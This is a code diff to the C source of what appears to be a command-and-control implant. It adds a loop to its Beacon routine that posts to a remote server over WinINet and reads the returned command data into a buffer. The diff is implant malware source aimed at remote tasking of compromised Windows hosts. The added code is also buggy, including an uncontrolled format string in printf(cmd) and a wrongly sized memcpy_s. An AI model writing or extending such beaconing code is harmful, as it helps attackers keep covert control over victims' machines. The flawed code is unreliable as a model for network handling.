@@ -101,6 +101,7 @@ BOOL Registration(CHAR **cookie) {
 }
 
 BOOL Beacon(CHAR  *cookie) {
+    printf("Beaconing");
     CHAR *cmd = NULL;
     agent.identifier = "beacon";
 
@@ -131,6 +132,29 @@ BOOL Beacon(CHAR  *cookie) {
                 HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                 HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
 
+                CHAR temp_buffer[8192 +1] = { 0 };
+                DWORD buffer_length = 0;
+                DWORD offset = 0;
+                while (TRUE) {
+                    DWORD available_size = 0;
+                    DWORD download_buffer;
+                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+                    if (!available || available_size == 0) {
+                        break;
+                    }
+
+                    available = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
+                    if (!available || download_buffer == 0) {
+                        break;
+                    }
+                    buffer_length += download_buffer;
+                    cmd = (CHAR*)realloc(cmd, buffer_length + 1);
+                    memcpy_s(cmd+offset, buffer_length, temp_buffer, download_buffer);
+                    memset(temp_buffer, 0, 8192+1);
+                    offset += download_buffer;
+                    printf(cmd);
+                }
+                free(cmd);
                 if (hRequest) {
                     InternetCloseHandle(hRequest);
                 }
@@ -144,7 +168,6 @@ BOOL Beacon(CHAR  *cookie) {
         }
     }
     free(post_buffer);
-    printf("Beaconing");
     return TRUE;
 }
 
